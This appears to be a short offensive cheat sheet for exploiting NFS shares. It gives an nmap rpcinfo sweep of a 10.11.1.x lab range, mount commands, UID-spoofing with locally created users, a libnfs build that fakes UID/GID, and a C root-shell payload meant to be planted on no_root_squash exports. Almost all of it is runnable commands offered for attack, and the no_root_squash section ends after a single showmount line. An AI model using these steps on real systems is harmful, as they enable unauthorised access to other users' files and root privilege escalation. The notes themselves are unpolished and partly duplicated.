### Enumurating

We can use NSE scripts like rpcinfo to find services that may have registered with rpcbind:

```shell
nmap -sV -p 111 --script=rpcinfo 10.11.1.1-254
```

### Mounting

```shell
mount -t nfs [-o vers=2] <ip>:<remote_folder> <local_folder> -o nolock
```

### Permissions

If you mount a folder which contains **files or folders only accesible by some user** (by **UID**). You can **create** **locally** a user with that **UID** and using that **user** you will be able to **access** the file/folder.

```shell
sudo adduser -u 1000 pwn
sudo addgroup -g 1000 pwn
usermod -u 2005 -g 1000 foo
usermod -a -G 2005 foo
```

###  fake UID/GID NFSv3/NFSv4 
```shell
#https://github.com/sahlberg/libnfs

#------------------
./bootstrap
./configure
make
gcc -fPIC -shared -o ld_nfs.so examples/ld_nfs.c -ldl -lnfs -I./include/ -L./lib/.libs/
#--------------
cat pwn.c
int main(void){setreuid(0,0); system("/bin/bash"); return 0;}
gcc pwn.c -o a.out
#------------------
gcc pwn.c -o a.out

```

###  `no_root_squash` (has the share behave like a traditional filesystem)
```shell
# SHow NFS Permissions
showmount -e 10.11.1.72 
```
